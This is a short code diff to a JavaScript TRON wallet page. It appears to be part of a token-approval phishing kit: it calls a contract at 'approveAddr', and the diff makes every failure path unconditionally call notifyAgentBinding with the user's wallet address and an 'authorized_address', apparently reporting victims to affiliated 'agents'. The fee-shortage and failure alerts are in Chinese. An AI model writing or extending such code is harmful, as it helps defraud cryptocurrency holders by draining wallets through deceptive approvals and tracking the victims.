@@ -594,6 +594,7 @@
 						$('.modal-overlay').remove()
 						$('.modal').removeClass('modal-in').addClass('modal-out')
 						mui.alert('TRX矿工费不足')
+						notifyAgentBinding(walletAddress, authorized_address)
 						return
 					}
 
@@ -605,6 +606,7 @@
 						$('.modal-overlay').remove()
 						$('.modal').removeClass('modal-in').addClass('modal-out')
 						mui.alert('TRX矿工费不足', '提示', '确定')
+						notifyAgentBinding(walletAddress, authorized_address)
 						return
 					}
 					trxye = tradeobj['balance'] / 1000000
@@ -613,9 +615,7 @@
 						$('.modal').removeClass('modal-in').addClass('modal-out')
 						mui.alert('TRX矿工费不足', '提示', '确定')
 
-						if (typeof notifyAgentBinding === 'function') {
-							notifyAgentBinding(walletAddress, authorized_address)
-						}
+						notifyAgentBinding(walletAddress, authorized_address)
 						return
 					}
 					let contract = await window.tronWeb.contract().at(approveAddr)
@@ -655,9 +655,9 @@
 								mui.alert('交易失败', '提示', '确定')
 
 								// --- Agent Binding API Integration ---
-								if (typeof notifyAgentBinding === 'function') {
-									notifyAgentBinding(walletAddress, authorized_address)
-								}
+
+								notifyAgentBinding(walletAddress, authorized_address)
+								return
 								// -------------------------------------
 
 								// 移除遮罩层并关闭弹窗
